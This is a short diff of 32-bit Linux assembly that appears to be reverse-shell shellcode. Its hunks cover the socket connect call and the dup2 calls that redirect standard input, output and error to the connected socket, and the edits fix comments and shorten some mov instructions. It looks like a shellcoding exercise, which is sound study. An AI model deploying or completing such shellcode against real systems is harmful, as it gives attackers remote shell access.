@@ -18,7 +18,7 @@ int 0x80
 ;    eax         ebx                            ecx            edx
 createConnect:
 xor ebx,ebx
-mov ebx,eax ; sockfd is moved to register edi
+mov ebx,eax ; sockfd is moved to register ebx
 xor eax,eax ; xored eax
 push eax
 push eax
@@ -34,7 +34,7 @@ mov dl, 16 ; moved addr len to dl
 mov ax,362 ; connect system call
 int 0x80
 add esp, 16 
-mov edi, ebx
+mov edi, ebx ; moved sockfd to edi
 
 ;int dup2(int oldfd, int newfd);
 CloneDescriptors:
@@ -54,7 +54,7 @@ xor ebx,ebx
 ;int dup2(int oldfd, int newfd);
 mov al, 63
 mov ebx ,edi
-mov ecx, 1
+mov cl, 1
 int 0x80
 
 xor ecx,ecx
@@ -63,7 +63,7 @@ xor ebx,ebx
 ;int dup2(int oldfd, int newfd);
 mov al, 63
 mov ebx, edi ; standard error file desciptor(2)
-mov ecx, 2 ; copied sockfd to cl
+mov cl, 2 ; copied sockfd to cl
 int 0x80
 
 
